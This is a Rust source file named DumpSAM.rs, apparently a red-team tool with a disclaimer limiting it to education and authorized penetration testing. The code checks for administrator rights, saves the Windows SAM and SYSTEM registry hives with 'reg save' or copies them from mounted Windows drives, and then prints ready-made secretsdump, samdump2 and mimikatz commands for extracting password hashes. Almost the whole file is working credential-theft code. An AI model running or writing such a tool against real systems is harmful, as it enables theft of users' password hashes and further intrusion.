/*
Script de Volcado de Base de Datos SAM
SAM Database Dump Script

Autor: RedTeam-Bypass
Versión: 1.0
Propósito: Educativo / Pruebas de penetración autorizadas
Purpose: Educational / Authorized Penetration Testing

ADVERTENCIA: Este script es solo para uso educativo y pruebas autorizadas.
WARNING: This script is for educational and authorized testing only.

Para compilar:
    rustc DumpSAM.rs

O con Cargo, crear Cargo.toml con:
    [package]
    name = "dumpsam"
    version = "0.1.0"
    edition = "2021"

Luego:
    cargo build --release
*/

use std::env;
use std::fs;
use std::io::{self, Write, BufRead};
use std::path::{Path, PathBuf};
use std::process::{Command, exit};

// Códigos de color ANSI
const COLOR_RED: &str = "\x1b[0;31m";
const COLOR_GREEN: &str = "\x1b[0;32m";
const COLOR_YELLOW: &str = "\x1b[1;33m";
const COLOR_CYAN: &str = "\x1b[0;36m";
const COLOR_WHITE: &str = "\x1b[1;37m";
const COLOR_GRAY: &str = "\x1b[0;37m";
const COLOR_RESET: &str = "\x1b[0m";

struct SAMDumper {
    output_dir: PathBuf,
    sam_file: Option<PathBuf>,
    system_file: Option<PathBuf>,
    use_color: bool,
}

impl SAMDumper {
    fn new() -> Self {
        SAMDumper {
            output_dir: PathBuf::new(),
            sam_file: None,
            system_file: None,
            use_color: cfg!(unix),
        }
    }

    fn color(&self, color: &str, text: &str) -> String {
        if self.use_color {
            format!("{}{}{}", color, text, COLOR_RESET)
        } else {
            text.to_string()
        }
    }

    fn print_banner(&self) {
        let line = "=".repeat(60);
        println!("{}", self.color(COLOR_CYAN, &line));
        println!("{}", self.color(COLOR_CYAN, "   Volcado de Base de Datos SAM - DumpSAM.rs"));
        println!("{}", self.color(COLOR_CYAN, "   SAM Database Dump Tool"));
        println!("{}", self.color(COLOR_CYAN, &line));
        println!();
    }

    fn print_system_info(&self) {
        println!("{}", self.color(COLOR_CYAN, "[*] Información del Sistema:"));
        println!("{}    Sistema Operativo:  {}", 
            self.color(COLOR_WHITE, ""), 
            env::consts::OS);
        println!("{}    Arquitectura:       {}", 
            self.color(COLOR_WHITE, ""), 
            env::consts::ARCH);
        
        if let Ok(hostname) = hostname::get() {
            println!("{}    Hostname:           {}", 
                self.color(COLOR_WHITE, ""), 
                hostname.to_string_lossy());
        }
        println!();
    }

    fn print_sam_info(&self) {
        println!("{}", self.color(COLOR_CYAN, "[*] Información sobre la Base de Datos SAM:"));
        println!();
        println!("{}", self.color(COLOR_WHITE, "La base de datos Security Account Manager (SAM) contiene:"));
        println!("{}", self.color(COLOR_GRAY, "  - Nombres de usuario locales"));
        println!("{}", self.color(COLOR_GRAY, "  - Hashes de contraseñas (NT hash, LM hash obsoleto)"));
        println!("{}", self.color(COLOR_GRAY, "  - SIDs (Security Identifiers)"));
        println!("{}", self.color(COLOR_GRAY, "  - Membresías de grupos"));
        println!();
        println!("{}", self.color(COLOR_GRAY, "Ubicación en Windows:"));
        println!("{}", self.color(COLOR_GRAY, "  - Archivo: C:\\Windows\\System32\\config\\SAM"));
        println!("{}", self.color(COLOR_GRAY, "  - Registro: HKLM\\SAM\\SAM\\Domains\\Account\\Users"));
        println!();
        println!("{}", self.color(COLOR_GRAY, "Estructura de cifrado de hashes:"));
        println!("{}", self.color(COLOR_GRAY, "  1. Hash MD4 de la contraseña (NT hash)"));
        println!("{}", self.color(COLOR_GRAY, "  2. Cifrado DES con RID del usuario como clave"));
        println!("{}", self.color(COLOR_GRAY, "  3. Cifrado con Password Encryption Key (PEK)"));
        println!("{}", self.color(COLOR_GRAY, "  4. PEK cifrado con LSA System Key"));
        println!();
    }

    fn is_admin(&self) -> bool {
        if cfg!(windows) {
            // En Windows, intentar ejecutar un comando que requiere admin
            Command::new("net")
                .args(&["session"])
                .output()
                .map(|output| output.status.success())
                .unwrap_or(false)
        } else {
            // En Unix, verificar si es root verificando permisos
            // Intentar leer un archivo que requiere root
            Path::new("/etc/shadow").metadata().is_ok()
        }
    }

    fn find_sam_files(&self) -> Result<(PathBuf, PathBuf), String> {
        println!("{}", self.color(COLOR_YELLOW, "[*] Buscando archivos SAM en el sistema..."));

        let sam_locations: Vec<&str>;
        let system_locations: Vec<&str>;

        if cfg!(windows) {
            sam_locations = vec![
                "C:\\Windows\\System32\\config\\SAM",
                "C:\\Windows\\System32\\config\\RegBack\\SAM",
            ];
            system_locations = vec![
                "C:\\Windows\\System32\\config\\SYSTEM",
                "C:\\Windows\\System32\\config\\RegBack\\SYSTEM",
            ];
        } else {
            sam_locations = vec![
                "/mnt/c/Windows/System32/config/SAM",
                "/media/Windows/System32/config/SAM",
            ];
            system_locations = vec![
                "/mnt/c/Windows/System32/config/SYSTEM",
                "/media/Windows/System32/config/SYSTEM",
            ];
        }

        let mut sam_file: Option<PathBuf> = None;
        let mut system_file: Option<PathBuf> = None;

        // Buscar archivo SAM
        for location in &sam_locations {
            let path = Path::new(location);
            if path.exists() {
                sam_file = Some(path.to_path_buf());
                println!("{}", self.color(COLOR_GREEN, 
                    &format!("[+] Archivo SAM encontrado: {}", location)));
                break;
            }
        }

        // Buscar archivo SYSTEM
        for location in &system_locations {
            let path = Path::new(location);
            if path.exists() {
                system_file = Some(path.to_path_buf());
                println!("{}", self.color(COLOR_GREEN, 
                    &format!("[+] Archivo SYSTEM encontrado: {}", location)));
                break;
            }
        }

        println!();

        match (sam_file, system_file) {
            (Some(sam), Some(system)) => Ok((sam, system)),
            _ => Err("No se encontraron archivos SAM/SYSTEM".to_string()),
        }
    }

    fn export_registry_keys(&mut self) -> Result<(), String> {
        if !cfg!(windows) {
            return Err("Esta función solo está disponible en Windows".to_string());
        }

        println!("{}", self.color(COLOR_YELLOW, "[*] Exportando claves de registro..."));

        let sam_output = self.output_dir.join("sam.hive");
        let system_output = self.output_dir.join("system.hive");

        // Exportar SAM
        println!("{}", self.color(COLOR_YELLOW, "[*] Exportando clave SAM..."));
        let output = Command::new("reg")
            .args(&["save", "HKLM\\SAM", sam_output.to_str().unwrap()])
            .output()
            .map_err(|e| format!("Error al exportar SAM: {}", e))?;

        if !output.status.success() {
            return Err(format!("Error al exportar SAM: {}", 
                String::from_utf8_lossy(&output.stderr)));
        }

        // Exportar SYSTEM
        println!("{}", self.color(COLOR_YELLOW, "[*] Exportando clave SYSTEM..."));
        let output = Command::new("reg")
            .args(&["save", "HKLM\\SYSTEM", system_output.to_str().unwrap()])
            .output()
            .map_err(|e| format!("Error al exportar SYSTEM: {}", e))?;

        if !output.status.success() {
            return Err(format!("Error al exportar SYSTEM: {}", 
                String::from_utf8_lossy(&output.stderr)));
        }

        println!("{}", self.color(COLOR_GREEN, "[+] Claves exportadas exitosamente"));
        println!("{}    SAM:    {}", 
            self.color(COLOR_WHITE, ""), 
            sam_output.display());
        println!("{}    SYSTEM: {}", 
            self.color(COLOR_WHITE, ""), 
            system_output.display());
        println!();

        self.sam_file = Some(sam_output);
        self.system_file = Some(system_output);

        Ok(())
    }

    fn copy_sam_files(&mut self, sam_src: &Path, system_src: &Path) -> Result<(), String> {
        println!("{}", self.color(COLOR_YELLOW, "[*] Copiando archivos SAM y SYSTEM..."));

        let sam_dst = self.output_dir.join("sam.hive");
        let system_dst = self.output_dir.join("system.hive");

        fs::copy(sam_src, &sam_dst)
            .map_err(|e| format!("Error al copiar SAM: {}", e))?;
        println!("{}", self.color(COLOR_GREEN, 
            &format!("[+] SAM copiado a: {}", sam_dst.display())));

        fs::copy(system_src, &system_dst)
            .map_err(|e| format!("Error al copiar SYSTEM: {}", e))?;
        println!("{}", self.color(COLOR_GREEN, 
            &format!("[+] SYSTEM copiado a: {}", system_dst.display())));

        println!();

        self.sam_file = Some(sam_dst);
        self.system_file = Some(system_dst);

        Ok(())
    }

    fn show_extraction_tools(&self) {
        let sam = self.sam_file.as_ref().unwrap().display();
        let system = self.system_file.as_ref().unwrap().display();

        println!("{}", self.color(COLOR_CYAN, "[*] Herramientas disponibles para extraer hashes:"));
        println!();
        println!("{}", self.color(COLOR_WHITE, "1. secretsdump.py (Impacket)"));
        println!("{}", self.color(COLOR_GRAY, "   Instalación: pip install impacket"));
        println!("{}   Uso: python -m impacket.examples.secretsdump -sam {} -system {} LOCAL",
            self.color(COLOR_GRAY, ""), sam, system);
        println!();
        println!("{}", self.color(COLOR_WHITE, "2. samdump2 (Linux)"));
        println!("{}", self.color(COLOR_GRAY, "   Instalación: apt-get install samdump2"));
        println!("{}   Uso: samdump2 {} {}", 
            self.color(COLOR_GRAY, ""), system, sam);
        println!();
        println!("{}", self.color(COLOR_WHITE, "3. mimikatz (Windows)"));
        println!("{}   Uso: lsadump::sam /sam:{} /system:{}",
            self.color(COLOR_GRAY, ""), sam, system);
        println!();
    }

    fn read_user_input(&self, prompt: &str) -> String {
        print!("{}", self.color(COLOR_YELLOW, prompt));
        io::stdout().flush().unwrap();
        
        let stdin = io::stdin();
        let mut line = String::new();
        stdin.lock().read_line(&mut line).unwrap();
        line.trim().to_string()
    }

    fn run(&mut self) -> Result<(), String> {
        self.print_banner();
        self.print_system_info();

        // Verificar privilegios de administrador
        if !self.is_admin() {
            println!("{}", self.color(COLOR_RED, 
                "[!] ADVERTENCIA: Este script requiere privilegios de administrador"));
            println!("{}", self.color(COLOR_RED, 
                "[!] Por favor, ejecute como administrador/root"));
            println!();
        } else {
            println!("{}", self.color(COLOR_GREEN, 
                "[+] Ejecutando con privilegios de administrador"));
            println!();
        }

        self.print_sam_info();

        // Crear directorio temporal de salida
        self.output_dir = env::temp_dir().join(format!("sam_dump_{}", 
            std::process::id()));
        fs::create_dir_all(&self.output_dir)
            .map_err(|e| format!("Error al crear directorio temporal: {}", e))?;

        println!("{}[*] Directorio de salida: {}", 
            self.color(COLOR_CYAN, ""), 
            self.output_dir.display());
        println!();

        // Buscar o exportar archivos SAM
        if cfg!(windows) {
            let response = self.read_user_input("[?] ¿Desea exportar las claves de registro? (s/n): ");
            if response.to_lowercase() == "s" || response.to_lowercase() == "y" {
                self.export_registry_keys()?;
            }
        } else {
            let (sam_file, system_file) = self.find_sam_files()?;
            self.copy_sam_files(&sam_file, &system_file)?;
        }

        // Mostrar herramientas de extracción
        if self.sam_file.is_some() && self.system_file.is_some() {
            self.show_extraction_tools();
        }

        println!();
        println!("{}", self.color(COLOR_CYAN, 
            &format!("[*] Archivos guardados en: {}", self.output_dir.display())));
        println!("{}", self.color(COLOR_CYAN, "[*] Proceso completado"));

        Ok(())
    }
}

// Módulo simple para obtener hostname
mod hostname {
    use std::process::Command;
    
    pub fn get() -> Result<std::ffi::OsString, ()> {
        // En Windows, usar variable de entorno
        #[cfg(windows)]
        {
            if let Ok(name) = std::env::var("COMPUTERNAME") {
                return Ok(std::ffi::OsString::from(name));
            }
        }
        
        // En Unix, usar comando hostname
        #[cfg(unix)]
        {
            if let Ok(output) = Command::new("hostname").output() {
                if output.status.success() {
                    let hostname = String::from_utf8_lossy(&output.stdout).trim().to_string();
                    return Ok(std::ffi::OsString::from(hostname));
                }
            }
        }
        
        Err(())
    }
}

fn main() {
    let mut dumper = SAMDumper::new();

    if let Err(e) = dumper.run() {
        eprintln!("{}[!] Error: {}{}", COLOR_RED, e, COLOR_RESET);
        exit(1);
    }
}
